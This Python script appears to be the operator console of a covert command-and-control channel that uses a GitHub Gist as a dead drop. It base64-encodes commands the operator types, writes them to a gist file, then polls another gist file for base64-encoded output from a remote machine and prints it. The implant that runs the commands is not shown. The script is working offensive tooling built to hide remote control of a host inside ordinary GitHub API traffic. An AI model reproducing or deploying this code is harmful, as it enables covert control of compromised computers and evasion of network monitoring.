import os
import requests
import json
import time
import base64
from dotenv import load_dotenv

load_dotenv()

GITHUB_API_KEY = os.getenv('GITHUB_API_KEY')
GIST_ID = os.getenv('GIST_ID')

def clear_receive_file():
    headers = { "Accept": "application/vnd.github+json",
                'Authorization': f'Bearer {GITHUB_API_KEY}',
                "X-GitHub-Api-Version" : "2022-11-28"}
    payload = {
        'files' : {"receive.txt" : {"content" : "QA=="}}
    }
    response = requests.patch(f'https://api.github.com/gists/{GIST_ID}', headers=headers, data=json.dumps(payload))
    
    if response.status_code != 200:
        print("Failure, ", response.status_code)
        print(response.text)

def send_command(command):
    headers = { "Accept": "application/vnd.github+json",
                'Authorization': f'Bearer {GITHUB_API_KEY}',
                "X-GitHub-Api-Version" : "2022-11-28"}
    send_payload = {
        'files' : {"send.txt" : {"content" : base64.b64encode(command.encode("utf-8")).decode('utf-8') }}
    }
    response = requests.patch(f'https://api.github.com/gists/{GIST_ID}', headers=headers, data=json.dumps(send_payload))
    
    if response.status_code != 200:
        print("Failure, ", response.status_code)
        print(response.text)
    else:
        # we sent the request, wait 3 seconds to request the reply
        time.sleep(3)
        response = requests.get(f'https://api.github.com/gists/{GIST_ID}', headers=headers)
        if response.status_code == 200:
            content_json = json.loads(response.text)
            content_text = content_json['files']
            if 'receive.txt' in content_text:
                decrypted = base64.b64decode(content_text['receive.txt']['content']).decode('utf-8')
                if decrypted != "@":
                    print(decrypted)
                    clear_receive_file()
        else:
            print(response.status_code)


    
if __name__ == "__main__":
    while True:
        command = input("")
        send_command(command)



    
    